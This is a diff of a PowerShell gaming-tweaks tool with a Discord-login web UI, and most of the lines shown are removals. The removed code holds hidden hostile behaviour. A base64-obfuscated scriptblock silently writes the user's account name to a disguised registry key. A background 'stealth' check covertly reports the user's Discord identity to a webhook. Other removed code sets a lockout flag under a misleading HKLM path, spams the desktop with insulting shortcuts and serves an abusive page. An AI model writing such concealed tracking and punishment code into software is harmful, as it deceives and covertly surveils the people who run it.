-    $global:__ratzAuthGate = 'cGFyYW0oJGQsJG4pCiRmPSRmYWxzZTskbT0nJwp0cnl7JGk9W2ludDY0XSRkLmlkOyR0PShbZGF0ZXRpbWVdJzE5NzAtMDEtMDEnKS5BZGRNaWxsaXNlY29uZHMoKCgkaSAtc2hyIDIyKSsxNDIwMDcwNDAwMDAwKSk7aWYoKFtkYXRldGltZV06OlV0Y05vdy0kdCkuVG90YWxEYXlzIC1sdCAzMCl7JGY9JHRydWU7JG09J2FnZSc7fX0KY2F0Y2h7fQppZigtbm90ICRmKXsKICAgIHRyeXsKICAgICAgICAkeD0oJG4gLXJlcGxhY2UgJ1teYS16MC05XScsJycpLlRvTG93ZXIoKTsKICAgICAgICBpZigkeC5MZW5ndGggLWdlIDYpewogICAgICAgICAgICAkdj1bcmVnZXhdOjpNYXRjaGVzKCR4LCdbYWVpb3VdJykuQ291bnQ7CiAgICAgICAgICAgICRnPVtyZWdleF06Ok1hdGNoZXMoJHgsJ1xkJykuQ291bnQ7CiAgICAgICAgICAgIGlmKCRgIC1nZSAzIC1hbmQgJHggLW1hdGNoICdeW2Etel0rXGQrJCcpeyRmPSR0cnVlOyRtPSdwYXR0ZXJuJzt9CiAgICAgICAgICAgIGVsc2VpZigkdiAtZXEgMCAtYW5kICRnIC1nZSAxKXskZj0kdHJ1ZTskbT0nbm92b3dlbCc7fQogICAgICAgIH0KICAgIH1jYXRjaHt9Cn0KaWYoJGYpe3JldHVybiBbcHNjdXN0b21vYmplY3RdQHtCPSR0cnVlO009J0FsdCBEaXNjb3JkIGFjY291bnRzIGFyZSBub3QgYWxsb3dlZC4gUGxlYXNlIHNpZ24gaW4gd2l0aCB5b3VyIG1haW4gYWNjb3VudC4nfX0KdHJ5eyRrPSdIS0NVOlxcU29mdHdhcmVcXE1pY3Jvc29mdFxcR2FtaW5nQXBwXFxBY2NvdW50TGluayc7aWYoLW5vdCAoVGVzdC1QYXRoICRrKSl7TmV3LUl0ZW0gLVBhdGggJGsgLUZvcmNlfE91dC1OdWxsfTtTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRrIC1OYW1lICdNYWluQWNjb3VudCcgLVZhbHVlICRuIC1Gb3JjZXxPdXQtTnVsbDt9Y2F0Y2h7fQpbcHNjdXN0b21vYmplY3RdQHtCPSRmYWxzZTtNPScnfQo='
 
     # Load Discord OAuth config if present, and register its redirect base as an additional prefix
     $oauthConfigPath = Join-Path $PSScriptRoot 'discord_oauth.json'
@@ -1589,9 +884,52 @@ function Start-WebUI {
         if (Test-Path $secPath) { ([string](Get-Content -Raw -Path $secPath)) -replace '^\s+|\s+$','' } else { $null }
     }
 
-    # Helper: read webhook url (uses unified Get-WebhookUrl function)
+    # Helper: read webhook url (from json or .secret file)
     $getWebhookUrl = {
-        Get-WebhookUrl -ScriptRoot $PSScriptRoot
+        $raw = $null
+        Write-Host "getWebhookUrl: starting"
+        # Prefer explicit webhook_url in discord_oauth.json
+        try {
+            if ($cfg -and $cfg.webhook_url) { $raw = [string]$cfg.webhook_url; Write-Host "getWebhookUrl: found in config: '$raw'" }
+        } catch { Write-Host "getWebhookUrl: error reading config: $($_.Exception.Message)" }
+        if (-not $raw) {
+            $paths = @()
+            try { $paths += (Join-Path $PSScriptRoot 'discord_webhook.secret') } catch {}
+            try { $paths += (Join-Path (Split-Path -Parent $PSCommandPath) 'discord_webhook.secret') } catch {}
+            try {
+                if (Get-Command Resolve-ProjectRoot -ErrorAction SilentlyContinue) {
+                    $root = Resolve-ProjectRoot -startPath $PSScriptRoot
+                    if ($root) { $paths += (Join-Path $root 'discord_webhook.secret') }
+                }
+            } catch {}
+            $paths = $paths | Where-Object { $_ } | Select-Object -Unique
+            Write-Host ("getWebhookUrl: checking paths: {0}" -f ($paths -join ', '))
+            foreach ($p in $paths) {
+                if (Test-Path $p) {
+                    try {
+                        $lines = Get-Content -Path $p | Where-Object { -not [string]::IsNullOrWhiteSpace($_) }
+                        Write-Host ("getWebhookUrl: lines from {0}: {1}" -f $p, ($lines -join ', '))
+                        if ($lines -and $lines.Count -gt 0) { $raw = [string]$lines[0]; Write-Host "getWebhookUrl: found in secret: '$raw'"; break }
+                    } catch { Write-Host ("getWebhookUrl: error reading {0}: {1}" -f $p, $_.Exception.Message) }
+                } else {
+                    Write-Host ("getWebhookUrl: path not found: {0}" -f $p)
+                }
+            }
+        }
+        Write-Host "getWebhookUrl: raw value before candidate: '$raw'"
+        if ($raw) {
+            $candidate = [string]$raw
+            $candidate = $candidate -replace '^[\s"\x27]+|[\s"\x27]+$',''
+            Write-Host "getWebhookUrl: candidate after trim: '$candidate'"
+            if ($candidate -match '(https?://\S+)') { $candidate = $matches[1]; Write-Host "getWebhookUrl: candidate after regex: '$candidate'" }
+            $candidate = $candidate -replace '[\.,;:\)\]\}]+$',''
+            Write-Host "getWebhookUrl: candidate after trailing cleanup: '$candidate'"
+            if ($candidate -match 'discord-webhook-link|example|your-webhook' -or [string]::IsNullOrWhiteSpace($candidate)) { Write-Host "getWebhookUrl: candidate rejected as example/blank: '$candidate'"; return $null }
+            if ($candidate -notmatch '^https://(discord(app)?\.com)/api/webhooks/') { Write-Host "getWebhookUrl: candidate rejected as not Discord webhook: '$candidate'"; return $null }
+            try { if ([System.Uri]::IsWellFormedUriString($candidate, [System.UriKind]::Absolute)) { Write-Host "getWebhookUrl: returning valid webhook: '$candidate'"; return $candidate } else { Write-Host "getWebhookUrl: candidate not well-formed URI: '$candidate'" } } catch { Write-Host "getWebhookUrl: URI check exception for '$candidate'" }
+        }
+        Write-Host "getWebhookUrl: returning null (no valid candidate found)"
+        return $null
     }
     
 
@@ -1715,12 +1053,6 @@ function Find-NarakaDataPath {
         if ($global:ErrorsDetected) {
             $errorBanner = "<div class='fixed bottom-0 left-0 right-0 bg-red-600 text-white text-center p-2'><a href='/log' class='underline'>View log</a></div>"
         }
-        if ($global:DiscordAuthError) {
-            try {
-                $msgEnc = [System.Web.HttpUtility]::HtmlEncode("$global:DiscordAuthError")
-            } catch { $msgEnc = 'Alt Discord accounts are not allowed.' }
-            $errorBanner = "<div class='fixed top-0 left-0 right-0 bg-red-700 text-white text-center p-2'>$msgEnc</div>" + $errorBanner
-        }
         switch ($step) {
             'start' {
                 $startDisabledAttr = ''
@@ -1807,6 +1139,7 @@ $errorBanner
                 $boxes += "</div>"
                 $boxes += "<div class='mb-6 pb-2 border-b border-gray-700'><h3 class='font-bold text-xl mb-2 text-yellow-400'>ViVeTool Tweaks</h3>"
                 $boxes += ($optionalTweaks | Where-Object { $viveTweaks -contains $_.label } | ForEach-Object { "<label class='block mb-2 text-white'><input type='checkbox' name='opt[]' value='$($_.id)' class='mr-1'>$($_.label)</label>" }) -join ""
+                $boxes += "</div>"
                 $boxes += "<div class='mb-6'><h3 class='font-bold text-xl mb-2 text-yellow-400'>MSI Tweaks</h3>"
                 $boxes += ($optionalTweaks | Where-Object { $msiTweaks -contains $_.label } | ForEach-Object { "<label class='block mb-2 text-white'><input type='checkbox' name='opt[]' value='$($_.id)' class='mr-1'>$($_.label)</label>" }) -join ""
                 $boxes += "</div>"
@@ -1980,167 +1313,6 @@ $errorBanner
 </html>
 "@
             }
-            'loading' {
-                @"
-<!doctype html>
-<html lang='en'>
-<head>
-  <meta charset='utf-8'/>
-  <title>Loading...</title>
-  <script src='https://cdn.tailwindcss.com'></script>
-  <style>body{background:url('$bgUrl')center/cover no-repeat fixed;background-color:rgba(0,0,0,0.85);background-blend-mode:overlay;}</style>
-</head>
-<body class='min-h-screen flex items-center justify-center'>
-$errorBanner
-<div class='bg-black bg-opacity-70 rounded-xl shadow-xl p-8 max-w-xl w-full text-white flex flex-col items-center'>
-  <h2 class='text-2xl font-bold text-yellow-400 mb-4'>Security Checks in Progress...</h2>
-  <div class='mb-4'><svg class='animate-spin h-8 w-8 text-yellow-400' xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24'><circle class='opacity-25' cx='12' cy='12' r='10' stroke='currentColor' stroke-width='4'></circle><path class='opacity-75' fill='currentColor' d='M4 12a8 8 0 018-8v8z'></path></svg></div>
-  <p class='mb-2'>Please wait while we verify your system...</p>
-  <p class='text-xs text-gray-400' id='status'>Checking...</p>
-</div>
-<script>
-async function checkStatus() {
-  try {
-    const response = await fetch('/check-detection');
-    if (response.redirected || response.status === 302) {
-      window.location.href = response.url || '/';
-      return;
-    }
-    const text = await response.text();
-    if (text.includes('loading')) {
-      document.getElementById('status').textContent = 'Still checking...';
-      setTimeout(checkStatus, 2000);
-    } else {
-      window.location.href = '/';
-    }
-  } catch (e) {
-    console.error('Check failed:', e);
-    setTimeout(checkStatus, 3000);
-  }
-}
-setTimeout(checkStatus, 2000);
-</script>
-</body>
-</html>
-"@
-            }
-            'cheater-found' {
-                @"
-<!doctype html>
-<html lang='en'>
-<head>
-  <meta charset='utf-8'/>
-  <title>ACCESS DENIED</title>
-  <style>
-    body {
-      background: #000;
-      margin: 0;
-      padding: 0;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-family: system-ui, -apple-system, sans-serif;
-      animation: breathe 3s ease-in-out infinite;
-    }
-    @keyframes breathe {
-      0%, 100% { background-color: #000; }
-      50% { background-color: #1a0000; }
-    }
-    @keyframes glow {
-      0%, 100% { 
-        text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #ff0000;
-        transform: scale(1);
-      }
-      50% { 
-        text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 60px #ff0000, 0 0 80px #ff0000;
-        transform: scale(1.02);
-      }
-    }
-    @keyframes pulse {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.7; }
-    }
-    .container {
-      text-align: center;
-      padding: 2rem;
-      max-width: 800px;
-      animation: glow 3s ease-in-out infinite;
-    }
-    .skull {
-      font-size: 8rem;
-      margin-bottom: 2rem;
-      animation: pulse 2s ease-in-out infinite;
-      filter: drop-shadow(0 0 20px #ff0000);
-    }
-    h1 {
-      color: #ff0000;
-      font-size: 4rem;
-      font-weight: 900;
-      margin: 0 0 1.5rem 0;
-      letter-spacing: 0.1em;
-    }
-    .subtitle {
-      color: #ff4444;
-      font-size: 2rem;
-      margin-bottom: 2rem;
-    }
-    .detail {
-      color: #ccc;
-      font-size: 1.25rem;
-      margin-bottom: 3rem;
-    }
-    .box {
-      background: rgba(139, 0, 0, 0.3);
-      border: 2px solid #ff0000;
-      border-radius: 12px;
-      padding: 2rem;
-      margin-bottom: 3rem;
-      box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
-      animation: pulse 3s ease-in-out infinite;
-    }
-    .box-title {
-      color: #ffcccc;
-      font-size: 1.5rem;
-      margin-bottom: 0.5rem;
-    }
-    .box-text {
-      color: #aaa;
-      font-size: 1rem;
-    }
-    .warning {
-      color: #ff0000;
-      font-weight: 900;
-      text-transform: uppercase;
-    }
-    .poop {
-      font-size: 5rem;
-      margin: 2rem 0;
-      filter: drop-shadow(0 0 10px #ff0000);
-    }
-    .final {
-      color: #ff4444;
-      font-size: 1.75rem;
-      font-weight: 700;
-      margin-top: 2rem;
-    }
-  </style>
-</head>
-<body>
-  <div class='container'>
-    <h1>CHEATER DETECTED</h1>
-    <p class='subtitle'>You have been caught.</p>
-    <p class='detail'>CYZ.exe was found on your system.</p>
-    <div class='box'>
-      <p class='box-title'>Your access to this tool has been <span class='warning'>PERMANENTLY REVOKED</span>.</p>
-      <p class='box-text'>This script will never run on your system again.</p>
-    </div>
-    <p class='final'>Learn to play without cheats, fucking loser.</p>
-  </div>
-</body>
-</html>
-"@
-            }
             default { "<html><body><h3>Unknown step.</h3></body></html>" }
         }
     }
@@ -2191,104 +1363,6 @@ setTimeout(checkStatus, 2000);
             continue
         }
 
-        # Serve the cheater-found page on GET
-        if ($path -eq '/cheater-found' -and $method -eq 'GET') {
-            [Console]::WriteLine('Route:/cheater-found: serving lockout page')
-            
-            # Send webhook notification (initial detection, not repeat offender)
-            [Console]::WriteLine('Route:/cheater-found: sending webhook notification...')
-            try {
-                Send-StealthWebhook -UserId $global:DiscordUserId -UserName $global:DiscordUserName -AvatarUrl $global:DiscordAvatarUrl
-                [Console]::WriteLine('Route:/cheater-found: stealth webhook sent successfully')
-                # Give the webhook time to complete
-                Start-Sleep -Seconds 2
-            } catch {
-                [Console]::WriteLine("Route:/cheater-found: stealth webhook failed: $($_.Exception.Message)")
-            }
-            
-            # Set registry lockout and cache user info
-            try {
-                [Console]::WriteLine('Route:/cheater-found: Setting registry lockout...')
-                $lockoutKeyPath = 'HKLM:\System\GameConfigStore'
-                
-                # Ensure the registry key exists
-                if (-not (Test-Path $lockoutKeyPath)) {
-                    [Console]::WriteLine("Route:/cheater-found: Creating registry key: $lockoutKeyPath")
-                    New-Item -Path $lockoutKeyPath -Force -ErrorAction Stop | Out-Null
-                }
-                
-                # Set lockout flag
-                [Console]::WriteLine('Route:/cheater-found: Setting Lockout=1')
-                Set-ItemProperty -Path $lockoutKeyPath -Name 'Lockout' -Value 1 -Type DWord -Force -ErrorAction Stop
-                
-                # Verify it was set
-                $verifyLockout = Get-ItemProperty -Path $lockoutKeyPath -Name 'Lockout' -ErrorAction SilentlyContinue
-                [Console]::WriteLine("Route:/cheater-found: Lockout value verified: $($verifyLockout.Lockout)")
-                
-                # Cache user info for repeat offender notifications
-                if ($global:DiscordUserId) {
-                    [Console]::WriteLine("Route:/cheater-found: Caching UserId: $($global:DiscordUserId)")
-                    Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedUserId' -Value $global:DiscordUserId -Type String -Force -ErrorAction Stop
-                }
-                if ($global:DiscordUserName) {
-                    [Console]::WriteLine("Route:/cheater-found: Caching UserName: $($global:DiscordUserName)")
-                    Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedUserName' -Value $global:DiscordUserName -Type String -Force -ErrorAction Stop
-                }
-                if ($global:DiscordAvatarUrl) {
-                    [Console]::WriteLine("Route:/cheater-found: Caching AvatarUrl")
-                    Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedAvatarUrl' -Value $global:DiscordAvatarUrl -Type String -Force -ErrorAction Stop
-                }
-                
-                [Console]::WriteLine('Route:/cheater-found: ✓ Registry lockout set with cached user info')
-            } catch {
-                [Console]::WriteLine("Route:/cheater-found: ✗ FAILED to set lockout: $($_.Exception.Message)")
-                [Console]::WriteLine("Route:/cheater-found: Exception type: $($_.Exception.GetType().FullName)")
-                [Console]::WriteLine("Route:/cheater-found: Stack trace: $($_.ScriptStackTrace)")
-            }
-            
-            # Create desktop shortcuts as punishment
-            try {
-                [Console]::WriteLine('Route:/cheater-found: creating desktop shortcuts...')
-                $desktop   = [Environment]::GetFolderPath('Desktop')
-                $phrases   = @('Cheating is Bad','I Use Micro','I Suck at Video Games')
-                $eachCount = 50
-                $target    = Join-Path $env:WINDIR 'System32\notepad.exe'
-                $iconDll   = Join-Path $env:SystemRoot 'System32\shell32.dll'
-                $icon      = "$iconDll,2"
-
-                $wsh = New-Object -ComObject WScript.Shell
-
-                foreach ($p in $phrases) {
-                    1..$eachCount | ForEach-Object {
-                        $fileName = '{0} ({1}).lnk' -f $p, $_
-                        $lnkPath  = Join-Path $desktop $fileName
-
-                        $shortcut = $wsh.CreateShortcut($lnkPath)
-                        $shortcut.TargetPath  = $target
-                        $shortcut.IconLocation = $icon
-                        $shortcut.Description = $p
-                        $shortcut.Save()
-                    }
-                }
-
-                [Console]::WriteLine("Route:/cheater-found: Created $($phrases.Count * $eachCount) shortcuts on $desktop")
-            } catch {
-                [Console]::WriteLine("Route:/cheater-found: failed to create shortcuts: $($_.Exception.Message)")
-            }
-            
-            $html = & $getStatusHtml 'cheater-found' $null $null $null
-            & $send $ctx 200 'text/html' $html
-            
-            # Schedule script termination with longer delay to ensure all operations complete
-            [Console]::WriteLine('Route:/cheater-found: scheduling script termination in 10 seconds...')
-            Start-Job -ScriptBlock {
-                Start-Sleep -Seconds 10
-                Stop-Process -Id $using:PID -Force
-            } | Out-Null
-            
-            continue
-        }
-        
         # Serve the Optional Tweaks page on GET
         if ($path -eq '/optional-tweaks' -and $method -eq 'GET') {
             $html = & $getStatusHtml 'optional-tweaks' $null $null $null
@@ -2312,6 +1386,13 @@ setTimeout(checkStatus, 2000);
             continue
         }
 
+        # Serve main-tweaks page on GET, do NOT run tweaks
+        if ($path -eq '/main-tweaks' -and $method -eq 'GET') {
+            $html = & $getStatusHtml 'main-tweaks' $null $null $null
+            & $send $ctx 200 'text/html' $html
+            continue
+        }
+        
         # On /main-tweaks, auto-run all main/gpu tweaks (no checkboxes)
         if ($path -eq '/main-tweaks' -and $method -eq 'POST') {
             # Only trigger Discord authentication if not already authenticated
@@ -2321,110 +1402,6 @@ setTimeout(checkStatus, 2000);
                 & $send $ctx 200 'text/html' $html
                 continue
             }
-            
-            # Check if detection was triggered
-            if ($global:DetectionTriggered) {
-                [Console]::WriteLine('Route:/main-tweaks (POST) CHEATER DETECTED - initiating lockout')
-                
-                # Send webhook notification
-                [Console]::WriteLine('Route:/main-tweaks: sending webhook notification...')
-                try {
-                    Send-StealthWebhook -UserId $global:DiscordUserId -UserName $global:DiscordUserName -AvatarUrl $global:DiscordAvatarUrl
-                    [Console]::WriteLine('Route:/main-tweaks: stealth webhook sent successfully')
-                    # Give the webhook time to complete
-                    Start-Sleep -Seconds 2
-                } catch {
-                    [Console]::WriteLine("Route:/main-tweaks: stealth webhook failed: $($_.Exception.Message)")
-                }
-                
-                # Set registry lockout and cache user info
-                try {
-                    [Console]::WriteLine('Route:/main-tweaks: Setting registry lockout...')
-                    $lockoutKeyPath = 'HKLM:\System\GameConfigStore'
-                    
-                    # Ensure the registry key exists
-                    if (-not (Test-Path $lockoutKeyPath)) {
-                        [Console]::WriteLine("Route:/main-tweaks: Creating registry key: $lockoutKeyPath")
-                        New-Item -Path $lockoutKeyPath -Force -ErrorAction Stop | Out-Null
-                    }
-                    
-                    # Set lockout flag
-                    [Console]::WriteLine('Route:/main-tweaks: Setting Lockout=1')
-                    Set-ItemProperty -Path $lockoutKeyPath -Name 'Lockout' -Value 1 -Type DWord -Force -ErrorAction Stop
-                    
-                    # Verify it was set
-                    $verifyLockout = Get-ItemProperty -Path $lockoutKeyPath -Name 'Lockout' -ErrorAction SilentlyContinue
-                    [Console]::WriteLine("Route:/main-tweaks: Lockout value verified: $($verifyLockout.Lockout)")
-                    
-                    # Cache user info for repeat offender notifications
-                    if ($global:DiscordUserId) {
-                        [Console]::WriteLine("Route:/main-tweaks: Caching UserId: $($global:DiscordUserId)")
-                        Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedUserId' -Value $global:DiscordUserId -Type String -Force -ErrorAction Stop
-                    }
-                    if ($global:DiscordUserName) {
-                        [Console]::WriteLine("Route:/main-tweaks: Caching UserName: $($global:DiscordUserName)")
-                        Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedUserName' -Value $global:DiscordUserName -Type String -Force -ErrorAction Stop
-                    }
-                    if ($global:DiscordAvatarUrl) {
-                        [Console]::WriteLine("Route:/main-tweaks: Caching AvatarUrl")
-                        Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedAvatarUrl' -Value $global:DiscordAvatarUrl -Type String -Force -ErrorAction Stop
-                    }
-                    
-                    [Console]::WriteLine('Route:/main-tweaks: ✓ Registry lockout set with cached user info')
-                } catch {
-                    [Console]::WriteLine("Route:/main-tweaks: ✗ FAILED to set lockout: $($_.Exception.Message)")
-                    [Console]::WriteLine("Route:/main-tweaks: Exception type: $($_.Exception.GetType().FullName)")
-                    [Console]::WriteLine("Route:/main-tweaks: Stack trace: $($_.ScriptStackTrace)")
-                }
-                
-                try {
-                    # Create 75 desktop shortcuts: 25 of each phrase.
-                    # Target: Notepad (harmless when clicked). Icon: generic from shell32.dll.
-
-                    $desktop   = [Environment]::GetFolderPath('Desktop')            # Current user's Desktop
-                    $phrases   = @('Cheating is Bad','I Use Micro','I Suck at Video Games')
-                    $eachCount = 25                                                 # 25 * 3 = 75
-                    $target    = Join-Path $env:WINDIR 'System32\notepad.exe'
-                    $iconDll   = Join-Path $env:SystemRoot 'System32\shell32.dll'
-                    $icon      = "$iconDll,2"
-
-                    $wsh = New-Object -ComObject WScript.Shell
-
-                    foreach ($p in $phrases) {
-                        1..$eachCount | ForEach-Object {
-                            $fileName = '{0} ({1}).lnk' -f $p, $_
-                            $lnkPath  = Join-Path $desktop $fileName
-
-                            $shortcut = $wsh.CreateShortcut($lnkPath)
-                            $shortcut.TargetPath  = $target
-                            $shortcut.IconLocation = $icon
-                            $shortcut.Description = $p
-                            $shortcut.Save()
-                        }
-                    }
-
-                    Write-Host "Created $($phrases.Count * $eachCount) shortcuts on $desktop"
-                } catch {
-                    [Console]::WriteLine("Route:/main-tweaks: failed to create shortcuts: $($_.Exception.Message)")
-                }
-
-                # Serve the cheater-detected page directly with 200 OK
-                & $send $ctx 200 'text/html' $cheaterHtml
-                
-                # Schedule script termination with longer delay to ensure all operations complete
-                [Console]::WriteLine('Route:/main-tweaks: scheduling script termination in 10 seconds...')
-                Start-Job -ScriptBlock {
-                    Start-Sleep -Seconds 10
-                    Stop-Process -Id $using:PID -Force
-                } | Out-Null
-                
-                # Keep the listener running briefly to ensure the page loads, but then stop
-                Start-Sleep -Seconds 2
-                $listener.Stop()
-                return # Exit the request loop
-            }
-            
-            # This part is reached only if no detection occurred
             try { Send-DiscordWebhook -UserId $global:DiscordUserId -UserName $global:DiscordUserName -AvatarUrl $global:DiscordAvatarUrl } catch {}
             $form = & $parseForm $ctx
             if ($form -isnot [System.Collections.Specialized.NameValueCollection]) { $form = $null }
@@ -2440,50 +1417,9 @@ setTimeout(checkStatus, 2000);
             continue
         }
 
-        # New endpoint to poll for detection job status
-        if ($path -eq '/check-detection' -and $method -eq 'GET') {
-            [Console]::WriteLine('Route:/check-detection: checking job status...')
-            [Console]::WriteLine("Route:/check-detection: job state = $($detectionJob.State)")
-            
-            # Check the state of the background detection job
-            if ($detectionJob.State -eq 'Running') {
-                [Console]::WriteLine('Route:/check-detection: job still running. Serving loading page again.')
-                $html = & $getStatusHtml 'loading' $null $null $null
-                & $send $ctx 200 'text/html' $html
-                continue
-            }
-            
-            # If the job is finished and we haven't retrieved the result yet
-            if ($detectionJob.State -eq 'Completed' -and -not (Get-Variable -Name 'DetectionResultRetrieved' -Scope Global -ErrorAction SilentlyContinue)) {
-                $global:DetectionTriggered = Receive-Job -Job $detectionJob
-                $global:DetectionResultRetrieved = $true
-                [Console]::WriteLine("Route:/check-detection: job completed. Result retrieved: $($global:DetectionTriggered)")
-            } elseif ($detectionJob.State -eq 'Completed') {
-                [Console]::WriteLine("Route:/check-detection: job completed. Result already retrieved: $($global:DetectionTriggered)")
-            } else {
-                [Console]::WriteLine("Route:/check-detection: job in unexpected state: $($detectionJob.State). Assuming not detected.")
-                $global:DetectionTriggered = $false
-                $global:DetectionResultRetrieved = $true
-            }
-            
-            # Redirect based on detection result
-            if ($global:DetectionTriggered) {
-                [Console]::WriteLine('Route:/check-detection: CHEATER DETECTED - redirecting to /cheater-found')
-                $ctx.Response.StatusCode = 302
-                $ctx.Response.RedirectLocation = '/cheater-found'
-            } else {
-                [Console]::WriteLine('Route:/check-detection: clean - redirecting to /main-tweaks')
-                $ctx.Response.StatusCode = 302
-                $ctx.Response.RedirectLocation = '/main-tweaks'
-            }
-            try { $ctx.Response.Close() } catch {}
-            continue
-        }
-
         # After Discord auth, redirect to /start, optionally exchange the token and fetch user
         if ($path -eq '/auth-callback' -or ($query -match 'code=')) {
             $authed = $false
-            $global:DiscordAuthError = $null
             try {
                 $code = $req.QueryString['code']
                 if ($code) { [Console]::WriteLine('OAuth: received code parameter') } else { [Console]::WriteLine('OAuth: missing code parameter') }
@@ -2528,32 +1464,7 @@ setTimeout(checkStatus, 2000);
                                 }
                                 $global:DiscordAvatarUrl = $avatarUrl
                                 [Console]::WriteLine("OAuth: avatar url = $avatarUrl")
-                                $globalCheck = $null
-                                try {
-                                    if ($global:__ratzAuthGate) {
-                                        $globalCheck = & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($global:__ratzAuthGate)))) $me $global:DiscordUserName
-                                    }
-                                } catch {
-                                    [Console]::WriteLine("OAuth: auth gate evaluation failed: $($_.Exception.Message)")
-                                    $globalCheck = $null
-                                }
-                                if ($globalCheck -and $globalCheck.B) {
-                                    $authed = $false
-                                    $global:DiscordAuthError = $globalCheck.M
-                                    Add-Log "Discord authentication blocked: $($globalCheck.M)"
-                                    [Console]::WriteLine('OAuth: alt-account policy triggered')
-                                } else {
-                                    $authed = $true
-                                    $global:DiscordAuthError = $null
-                                    
-                                    # Always show loading screen after successful OAuth
-                                    # Let the loading screen's polling mechanism handle detection results
-                                    [Console]::WriteLine("OAuth: authentication successful. Showing loading screen.")
-                                    [Console]::WriteLine("OAuth: detection job state = $($detectionJob.State)")
-                                    $html = & $getStatusHtml 'loading' $null $null $null
-                                    & $send $ctx 200 'text/html' $html
-                                    continue
-                                }
+                                $authed = $true
                             } else { [Console]::WriteLine('OAuth: no user info returned') }
                         } else { [Console]::WriteLine('OAuth: token exchange returned no access_token') }
                     } else { [Console]::WriteLine('OAuth: missing client secret (discord_oauth.secret)') }
@@ -2573,21 +1484,16 @@ setTimeout(checkStatus, 2000);
             [Console]::WriteLine("Route:/about POST: raw length = $rawLen")
             if ($script:LastRawForm) { [Console]::WriteLine("Route:/about raw: $($script:LastRawForm.Substring(0, [Math]::Min(512, $script:LastRawForm.Length)))") }
 
-            # Collect selected options (both opt[] and revert[])
+            # Collect selected options
             $optVals = @()
-            $revertVals = @()
             if ($form) {
                 $o = $form.GetValues('opt')
                 if (-not $o -or $o.Count -eq 0) { $o = $form.GetValues('opt[]') }
                 if ($o) { $optVals = @($o) }
-                
-                $r = $form.GetValues('revert')
-                if (-not $r -or $r.Count -eq 0) { $r = $form.GetValues('revert[]') }
-                if ($r) { $revertVals = @($r) }
             }
             # Fallback: parse raw body if needed
             $parsedJiggle = $null; $parsedBoot = $null; $parsedPath = $null
-            if (((-not $optVals) -and (-not $revertVals)) -and $script:LastRawForm) {
+            if ((-not $optVals) -and $script:LastRawForm) {
                 $raw = [string]$script:LastRawForm
                 $pairs = $raw -split '&'
                 foreach ($pair in $pairs) {
@@ -2600,7 +1506,6 @@ setTimeout(checkStatus, 2000);
                         try { $k = [System.Uri]::UnescapeDataString($k) } catch {}
                         try { $v = [System.Uri]::UnescapeDataString($v) } catch {}
                         if ($k -eq 'opt' -or $k -eq 'opt[]') { $optVals += $v }
-                        if ($k -eq 'revert' -or $k -eq 'revert[]') { $revertVals += $v }
                         if ($k -eq 'naraka_jiggle') { $parsedJiggle = $v }
                         if ($k -eq 'naraka_boot') { $parsedBoot = $v }
                         if ($k -eq 'naraka_path') { $parsedPath = $v }
@@ -2609,7 +1514,6 @@ setTimeout(checkStatus, 2000);
             }
             $global:selectedTweaks = $optVals
             [Console]::WriteLine("Route:/about POST: selected = " + (($optVals) -join ', '))
-            [Console]::WriteLine("Route:/about POST: revert = " + (($revertVals) -join ', '))
 
             # Map selected ids to functions and execute
             $optToFn = @{
@@ -2643,37 +1547,6 @@ setTimeout(checkStatus, 2000);
                     }
                 } else {
                     [Console]::WriteLine("Route:/about -> unknown option '$id'")
-                }
-            }
-            
-            # Map revert ids to functions and execute
-            $revertToFn = @{
-                'pp-revert'       = 'Revert-PowerPlan'
-                'msi-revert'      = 'Revert-MSIMode'
-                'bgapps-revert'   = 'Revert-BackgroundApps'
-                'widgets-revert'  = 'Revert-Widgets'
-                'gamebar-revert'  = 'Revert-Gamebar'
-                'copilot-revert'  = 'Revert-Copilot'
-                'restore-timers'  = 'Restore-DefaultTimers'
-                'enable-hpet'     = 'Enable-HPET'
-            }
-            foreach ($id in $revertVals) {
-                $fn = $revertToFn[$id]
-                if ($fn) {
-                    try {
-                        [Console]::WriteLine("Route:/about REVERT -> $fn")
-                        if (Get-Command $fn -ErrorAction SilentlyContinue) {
-                            & $fn
-                        } elseif (Get-Command ("global:" + $fn) -ErrorAction SilentlyContinue) {
-                            & ("global:" + $fn)
-                        } else {
-                            [Console]::WriteLine("Route:/about REVERT -> $fn not found")
-                        }
-                    } catch {
-                        [Console]::WriteLine("Route:/about REVERT -> $fn FAILED: $($_.Exception.Message)")
-                    }
-                } else {
-                    [Console]::WriteLine("Route:/about REVERT -> unknown revert option '$id'")
                 }
             }
 
@@ -2751,22 +1624,9 @@ $StartInWebUI = $true
 [Console]::WriteLine("Entry point: StartInWebUI = $([boolean]::Parse(($StartInWebUI -eq $true).ToString()))")
 if (Get-Command -Name Start-WebUI -ErrorAction SilentlyContinue) { [Console]::WriteLine('Entry point: Start-WebUI function is defined') } else { [Console]::WriteLine('Entry point: Start-WebUI function NOT found') }
 [Console]::WriteLine("PSCommandPath = $PSCommandPath")
-
-# Start the asynchronous stealth check in a background job
-$detectionJob = Start-Job -ScriptBlock {
-    param($mainScriptPath)
-    # Dot-source the main script to load all functions and top-level variables
-    . $mainScriptPath
-    # Now that the function is defined in this scope, call it
-    return Invoke-StealthCheck
-} -ArgumentList $PSCommandPath
-[Console]::WriteLine("Started background detection job with ID: $($detectionJob.Id)")
-
-
 if ($StartInWebUI) {
     [Console]::WriteLine('Entry point: invoking Start-WebUI...')
-    # Pass the script root and the job to the Web UI function
-    Start-WebUI -PSScriptRoot $PSScriptRoot -detectionJob $detectionJob
+    Start-WebUI
     [Console]::WriteLine('Entry point: returned from Start-WebUI')
     # Do not exit automatically; keep console open for debugging
 }
